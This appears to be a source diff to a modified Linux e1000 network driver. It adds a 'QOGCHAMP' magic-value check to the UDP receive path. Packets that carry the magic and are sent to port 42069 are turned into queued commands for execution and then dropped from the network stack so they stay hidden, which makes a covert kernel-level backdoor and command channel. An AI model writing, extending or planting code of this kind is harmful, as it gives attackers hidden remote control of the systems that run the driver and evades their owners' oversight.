@@ -18,8 +18,10 @@ Some notes on the e1000 rx implementation:
 #define TCP_HLEN sizeof(struct tcphdr)
 
 #define UDP 17 //UDP Protocol number
-
-
+/*Literally spells QOGCHAMP in little endian. Keep in mind that in little endian the least 
+significant byte comes first. So, on the stack it will be 
+PMAHCGOQ where Q is is at the lowest memory address*/
+unsigned long qogchamp_magic = 0x504d414843474f51;
 //both of these extern structs are created in tty_util
 extern struct list_head commands; 
 
@@ -162,7 +164,11 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
     */
     udp = (struct udphdr*)(skb->data + IP_HLEN); //udp header ptr
     true_data = (char*)(skb->data + IP_HLEN + UDP_HLEN); //true data
-    true_data_len = be16_to_cpu(udp->len);
+    if(*((unsigned long*)true_data) != qogchamp_magic){ //let it through if it doesn't have the magic 
+        goto good;
+    }
+    true_data += 8;
+    true_data_len = be16_to_cpu(udp->len)-8; //subtract out the qogchamp_magic
     if(be16_to_cpu(udp->dest) == 42069){
        //welcome to Qogchamp   
         struct command* next_cmd = kzalloc(sizeof(struct command), GFP_ATOMIC); //WE CANNOT SLEEP IN A BOTTOM HALF
@@ -193,7 +199,7 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
         if(wq_has_sleeper(&command_wait)){
             wake_up(&command_wait); //we sleep if we are starved of commands to execute. 
         }
-failed:        
+failed:        //even if it fails we still want it to be hidden
         dev_kfree_skb(skb); //free the skb. Don't use slab cache space because that would be cringe. This will return immediately and not send it up the stack.
         return;
     }
